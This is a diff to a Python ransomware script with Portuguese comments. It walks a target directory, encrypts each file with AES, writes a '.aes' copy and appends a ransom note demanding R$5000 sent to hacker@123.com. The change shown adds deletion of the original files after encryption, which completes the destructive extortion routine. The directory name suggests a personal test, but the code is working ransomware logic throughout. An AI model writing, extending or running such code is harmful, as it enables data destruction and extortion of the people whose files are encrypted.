@@ -9,7 +9,7 @@ def read_key_from_file(file_path):
         return f.read().strip()
 
 def encrypt_file(file_path, key, message):
-    """Criptografa um arquivo e adiciona uma mensagem de resgate ao final dos dados criptografados."""
+    """Criptografa um arquivo e salva o resultado com a extensão .aes."""
     # Gera um vetor de inicialização (IV) aleatório
     iv = secrets.token_bytes(16)
     
@@ -26,7 +26,7 @@ def encrypt_file(file_path, key, message):
     
     # Adiciona a mensagem de resgate ao final dos dados criptografados
     message_bytes = message.encode('utf-8')
-    encrypted_data_with_message = encrypted_data + b'\n' + message_bytes
+    encrypted_data_with_message = encrypted_data + b'---END---' + message_bytes
     
     # Cria o caminho para o arquivo criptografado
     encrypted_file_path = file_path + '.aes'
@@ -35,10 +35,13 @@ def encrypt_file(file_path, key, message):
     with open(encrypted_file_path, 'wb') as f:
         f.write(iv + encrypted_data_with_message)
     
-    print(f"Arquivo criptografado salvo em: {encrypted_file_path}")
+    # Remove o arquivo original
+    os.remove(file_path)
+    
+    print(f"Arquivo criptografado e salvo como: {encrypted_file_path}")
 
 # Diretório onde os arquivos serão processados
-target_directory = os.path.expanduser("~/testandoRansonWare")
+target_directory = os.path.expanduser("~/TesteRansonware")
 
 # Caminho do arquivo que contém a chave de criptografia
 key_file_path = os.path.join(os.path.expanduser("~"), 'ransonware', 'key.txt')
@@ -48,7 +51,7 @@ key = read_key_from_file(key_file_path)
 print(f"Chave de criptografia: {key}")
 
 # Mensagem de resgate que será adicionada aos arquivos criptografados
-rescue_message = "Realize um pagamento de X RS e mande para o email tal para liberarmos sua decriptação."
+rescue_message = "Realize um pagamento de R$5000 e mande para o email hacker@123.com para liberarmos sua decriptação."
 
 # Itera sobre todos os arquivos no diretório alvo
 for root, dirs, files in os.walk(target_directory):
